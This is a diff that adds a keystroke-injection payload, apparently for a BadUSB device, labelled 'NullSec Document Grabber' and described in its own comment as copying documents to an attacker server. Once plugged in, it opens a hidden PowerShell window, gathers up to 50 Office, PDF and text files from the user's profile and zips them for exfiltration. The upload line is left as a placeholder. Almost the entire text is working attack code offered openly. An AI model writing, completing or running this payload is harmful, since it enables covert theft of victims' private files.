@@ -1,0 +1,20 @@
+REM NullSec Document Grabber
+REM Copies documents to attacker server
+
+DELAY 1000
+GUI r
+DELAY 500
+STRING powershell -w hidden
+ENTER
+DELAY 1000
+
+STRING $docs = Get-ChildItem -Path $env:USERPROFILE -Include *.doc,*.docx,*.pdf,*.xls,*.xlsx,*.txt -Recurse -ErrorAction SilentlyContinue | Select -First 50
+ENTER
+STRING $zip = "$env:TEMP\docs_$(Get-Date -Format 'yyyyMMdd').zip"
+ENTER
+STRING Compress-Archive -Path $docs.FullName -DestinationPath $zip -Force
+ENTER
+STRING # Upload to your server here
+ENTER
+STRING exit
+ENTER
